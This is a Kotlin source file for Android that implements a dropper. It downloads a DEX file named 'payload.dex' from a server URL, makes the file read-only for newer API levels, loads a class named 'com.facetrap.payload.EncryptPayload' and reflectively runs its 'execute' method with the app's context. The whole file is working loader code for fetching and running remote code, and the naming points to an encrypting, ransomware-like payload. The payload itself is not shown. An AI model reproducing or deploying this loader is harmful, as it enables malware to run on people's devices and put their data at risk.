import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

object DexLoader {

    private const val TAG = "DexLoader"

    fun downloadAndLoad(context: Context, serverUrl: String) {
        Thread {
            try {
                Log.d(TAG, "1. Called with URL: $serverUrl")

                val url = URL(serverUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 10000

                Log.d(TAG, "2. Connected, response: ${conn.responseCode}")

                if (conn.responseCode != 200) {
                    Log.e(TAG, "Server error: ${conn.responseCode}")
                    return@Thread
                }

                val dexFile = File(context.filesDir, "payload.dex")

                conn.inputStream.use { input ->
                    dexFile.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }

                Log.d(TAG, "3. Downloaded, size: ${dexFile.length()} bytes")

                // 🔥 FIX: Make dex file read‑only (required for API 26+)
                dexFile.setReadOnly()
                Log.d(TAG, "3.5. Dex file set to read-only")

                val dexDir = context.filesDir.absolutePath

                val classLoader = DexClassLoader(
                    dexFile.absolutePath,
                    dexDir,
                    null,
                    context.classLoader
                )

                Log.d(TAG, "4. DexClassLoader created")

                val clazz = classLoader.loadClass(
                    "com.facetrap.payload.EncryptPayload"
                )

                Log.d(TAG, "5. Class loaded: ${clazz.name}")

                val instance = clazz.getDeclaredConstructor().newInstance()

                val method = clazz.getMethod(
                    "execute",
                    Context::class.java
                )

                Log.d(TAG, "6. Method found, invoking...")

                method.invoke(instance, context)

                Log.d(TAG, "7. Payload executed successfully")

            } catch (e: Exception) {
                Log.e(TAG, "ERROR: ${e.message}", e)
            }
        }.start()
    }
}